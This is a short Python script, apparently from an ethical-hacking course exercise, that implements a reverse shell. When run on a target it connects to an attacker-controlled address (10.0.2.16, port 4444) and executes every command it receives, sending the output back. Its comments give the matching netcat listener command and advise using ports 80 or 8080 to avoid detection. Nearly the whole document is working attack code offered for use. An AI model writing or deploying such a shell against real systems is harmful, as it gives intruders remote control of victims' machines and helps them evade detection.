#!/usr/bin/env python
# this program when executed on target computer try to establish connection to specific port of hacker device
#we will write program for listening and waiting for connection in hacker but now use tool netcat(used in pentesting) command to listen connection in hacker at specific port is down below
# nc -vv -l -p 4444 #vv to see compherensive info about whats happening when program running,l to listen,p for port to open for listening 
# can use port 80 or 8080 for less detectible
# once wifi comes then creat chat program using socket
import socket,subprocess
def execute_system_command(command):
    return subprocess.check_output(command)


connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#socket.AF_INET is address family used in socket connection,socket type when you want to establish tcp connection use socket.SOCK_STREAM
connection.connect(("10.0.2.16",4444))#this will connect the socket(pipe) to destination(ip and port of destination listening)
# run this here will connect for less time no data transfered
connection.send("\n[+] Connection established\n")#this will send data from target to hacker
while True:
    command=connection.recv(1024)#1024 is buffer size(size of each batch of data can be received at a time).this will receive data from hacker
    command_result=execute_system_command(command)#simple calling function
    connection.send(command_result)
    # print(command)
    # while true for executing multiple command so it dont go to connection.close() and closes
connection.close()

